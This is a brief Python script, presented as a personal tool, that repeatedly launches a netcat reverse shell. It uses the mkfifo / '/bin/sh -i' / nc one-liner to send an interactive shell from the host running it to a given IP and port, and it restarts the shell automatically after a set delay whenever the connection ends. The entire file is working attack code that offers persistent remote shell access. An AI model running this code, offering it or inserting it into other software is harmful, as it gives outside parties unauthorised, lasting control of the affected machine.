#!/usr/bin/env python3
import argparse
import subprocess as sp
import time

def main():
    parser = argparse.ArgumentParser(description="Julian's Reconnector - a simple tool to reconnect to your netcat reverse shells :)", epilog="Example: reconnector 192.168.69.420 6767 5")
    required_args = parser.add_argument_group("Required arguments")
    required_args.add_argument("ip", help="IP address (eg. 127.0.0.1, 192.168.1.1)")
    required_args.add_argument("port", type=int, help="Port number (eg. 4444, 8080, 1234)")
    required_args.add_argument("delay", type=int, help="Delay between reconnects (in seconds)")
    args = parser.parse_args()
    connect(args.ip, args.port, args.delay)

def connect(ip, port, delay):
    print(f"Connecting to {ip}:{port}")
    process = sp.Popen(f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f", shell=True)
    while True:
        time.sleep(delay)
        try:
            if process.poll() is not None:
                print("Process terminated, restarting...")
                process = sp.Popen(f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f", shell=True)
        except Exception:
            print("Exiting...")
            break

if __name__ == "__main__":
    main()
